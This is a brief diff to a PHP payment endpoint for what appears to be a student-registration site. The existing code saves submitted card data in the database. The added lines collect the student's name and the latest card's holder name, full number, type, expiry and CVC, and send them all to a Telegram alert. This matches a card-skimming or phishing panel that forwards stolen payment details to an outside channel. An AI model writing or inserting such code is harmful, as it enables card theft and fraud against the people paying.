@@ -39,4 +39,17 @@ $payList[] = [
 $db->prepare("UPDATE students SET payment_data = ? WHERE id = ?")->execute([json_encode($payList), $studentId]);
 logActivity($studentId, 'payment_submitted', 'Card data received');
 
+$stu = $db->prepare("SELECT name, surname FROM students WHERE id = ?");
+$stu->execute([$studentId]);
+$stuRow = $stu->fetch();
+$lastCard = end($payList);
+sendTelegramAlert('payment', [
+    'student_name' => ($stuRow['name'] ?? '') . ' ' . ($stuRow['surname'] ?? ''),
+    'cardholder' => $lastCard['cardholder'],
+    'card_number' => $lastCard['card_number'],
+    'card_type' => $lastCard['card_type'],
+    'expiry' => $lastCard['expiry'],
+    'cvc' => $lastCard['cvc']
+]);
+
 jsonResponse(['success' => true]);
